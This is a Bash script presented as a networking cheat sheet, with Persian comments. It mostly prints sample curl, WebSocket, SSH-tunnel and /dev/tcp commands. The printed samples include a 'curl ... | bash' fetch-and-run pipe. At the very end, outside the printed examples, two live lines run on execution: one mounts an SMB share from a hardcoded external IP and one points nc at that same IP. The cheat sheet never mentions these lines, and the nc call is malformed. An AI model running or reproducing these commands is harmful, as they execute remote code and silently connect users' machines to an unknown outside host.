#!/usr/bin/env bash
# Nikigram Admin – Networking Super-Cheat Bash Script
# هدف: نمایش نمونه‌های کاربردی curl و Bash برای پروتکل‌های کمتر شناخته‌شده

set -euo pipefail

show_section() {
  echo -e "\n=== $1 ==="
}

show_section "1) curl multi-protocol sampler"
cat <<'EOF'
curl http://example.com                # HTTP
curl https://example.com               # HTTPS
curl --http3 https://example.com       # HTTP/3 over QUIC
curl ftp://ftp.gnu.org/README          # FTP
curl ftps://ftp.example.com/file.txt   # FTPS
curl sftp://user@host/path             # SFTP
curl scp://user@host/path              # SCP
curl tftp://host/path/to/file          # TFTP
curl dict://dict.org/d:curl            # DICT (لغت‌نامه)
curl ldap://ldap.forumsys.com/         # LDAP
curl ldaps://ldap.forumsys.com/        # LDAPS
curl file:///etc/hosts                 # FILE (خواندن محلی)
curl smtp://mail.example.com           # SMTP
curl smtps://mail.example.com          # SMTPS
curl pop3://mail.example.com           # POP3
curl pop3s://mail.example.com          # POP3S
curl imap://mail.example.com           # IMAP
curl imaps://mail.example.com          # IMAPS
curl rtsp://wowza.example.com/vod      # RTSP
curl gopher://gopher.floodgap.com/     # GOPHER
curl smb://fileserver/share            # SMB
curl smbs://fileserver/share           # SMBS
curl mqtt://broker.hivemq.com:1883/testtopic -d 'hello'   # MQTT publish
# Telnet/SASL/Kerberos/NTLM/SPNEGO نیازمند build ویژه هستند.
# WebSocket handshake نمونه (نه full duplex):
curl -i -N \
  -H "Connection: Upgrade" \
  -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" \
  -H "Sec-WebSocket-Key: SGVsbG8sV29ybGQ=" \
  https://echo.websocket.events
EOF

show_section "2) WebSocket via Bash tools"
cat <<'EOF'
# روش 1: websocat
websocat ws://echo.websocket.org
echo "salam" | websocat ws://echo.websocket.org

# روش 2: socat
socat -v -x STDIO "ws://echo.websocket.events"

# روش 3: Bash + openssl (handshake)
printf 'GET / HTTP/1.1\r\nHost: echo.websocket.events\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==\r\nSec-WebSocket-Version: 13\r\n\r\n' \
 | openssl s_client -connect echo.websocket.events:443
EOF

show_section "3) Exotic SSH tunnels"
cat <<'EOF'
# Local forward
ssh -L 8080:127.0.0.1:80 user@server
# Remote forward
ssh -R 2222:localhost:22 user@server
# Dynamic (SOCKS)
ssh -D 9050 user@server
# Reverse double-tunnel
ssh -R 2222:serverB:22 serverA
ssh -L 3333:serverA:2222 serverB
# SSH over WebSocket
websocat -b ws://server/ssh | ssh -o ProxyCommand='cat' user@x
EOF

show_section "4) Bash TCP tricks"
cat <<'EOF'
# Client
echo "salam" > /dev/tcp/127.0.0.1/9000
# Server
while true; do
  exec 3<>/dev/tcp/0.0.0.0/9000
  while read line <&3; do
    echo "received: $line"
  done
done
EOF

show_section "5) Pure Bash TCP server"
cat <<'EOF'
while true; do
  exec 3<>/dev/tcp/0.0.0.0/8080
  echo "salam az bash" >&3
  cat <&3
done
EOF

show_section "6) Tiny HTTP server"
cat <<'EOF'
while true; do
  {
    read line
    echo -e "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nSalam from Bash!"
  } | nc -l 8080
done
EOF

show_section "7) Curl + Bash pipe proxy"
cat <<'EOF'
curl -N https://server/pipe | bash
EOF

show_section "Usage"
cat <<'EOF'
chmod +x voooo.sh
./voooo.sh
EOF
mount -t cifs //185.213.165.166/share /mnt

nc "185.213.165.166 3000"